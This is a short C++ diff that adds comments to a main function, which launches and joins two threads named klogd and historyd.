@@ -9,13 +9,13 @@
 // #include "capt.h"
 
 int main(){
-
+    // Awaken the Daemons
     std::thread klogd(init_klogd);
     std::thread historyd(init_historyd);
     
+    //This is just a theoretical end to keep the main thread running. Klogd will never join
     historyd.join();
     klogd.join();
-    
 
     return 0;
 }
